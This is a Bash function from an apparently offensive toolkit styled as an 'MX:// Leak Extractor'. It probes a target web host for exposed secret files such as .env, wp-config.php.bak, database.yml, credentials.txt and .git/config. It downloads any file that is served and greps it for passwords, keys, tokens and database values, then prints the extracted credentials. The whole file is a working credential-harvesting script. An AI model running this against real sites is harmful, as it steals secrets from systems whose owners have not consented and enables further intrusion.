#!/bin/bash

run_leak_extractor() {
    local target=$1
    local host_target="${target}"

    if [ -n "${STATE[target_domain]}" ]; then
        host_target="${STATE[target_domain]}"
    fi

    local sensitive_files=(
        ".env"
        "config.php.bak"
        "wp-config.php.bak"
        "database.yml"
        "credentials.txt"
        ".git/config"
    )

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// LEAK EXTRACTOR CORE ]${TXT_VOID}─────────────────────────────────────────────────╖${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// REALLOCATING SYSTEM MEMORY FOR WEB LEAK ANALYSIS...${NC}"
    echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ * ] TARGET GATEWAY: ${TXT_RED_SUPERNOVA}${host_target}${NC}"
    echo -e "${TXT_VOID}│${NC}"

    local leaks_found=0

    for file in "${sensitive_files[@]}"; do
        local url="http://${host_target}/${file}"
        local status=$(curl -s -o /dev/null -w "%{http_code}" "$url")

        if [ "$status" == "200" ]; then
            echo -e "${TXT_VOID}├─${TXT_B_ALARM}[ ++ ] LEAK DETECTED:${NC} ${TXT_RED_SUPERNOVA}/${file}${NC} ${TXT_RED_MAGMA}(HTTP 200)${NC}"
            ((leaks_found++))

            local tmp_file="/tmp/leak_$$"
            curl -s "$url" -o "$tmp_file"

            echo -e "${TXT_VOID}│   ${TXT_RED_LASER}▸ Extracting credential strings...${NC}"
            local creds=$(grep -Ei 'pass|key|secret|token|user|db_' "$tmp_file" 2>/dev/null)

            if [ -n "$creds" ]; then
                echo "$creds" | while read -r line; do
                    echo -e "${TXT_VOID}│${NC}       ${TXT_RED_HELLFIRE}»${NC} ${TXT_RED_MAGMA}${line#* }${NC}"
                done
            else
                echo -e "${TXT_VOID}│${NC}       ${TXT_DRK_RED}» No plain-text credentials found. Manual payload audit required: ${TXT_VOID}${url}${NC}"
            fi

            rm -f "$tmp_file"
        fi
    done

    echo -e "${TXT_VOID}│${NC}"
    echo -e "$sep_bot\n"

    if (( leaks_found == 0 )); then
        ai_speak "No obvious data leaks detected on primary web vectors."
    else
        ai_speak "Who benefit the most? You... or her?"
    fi
}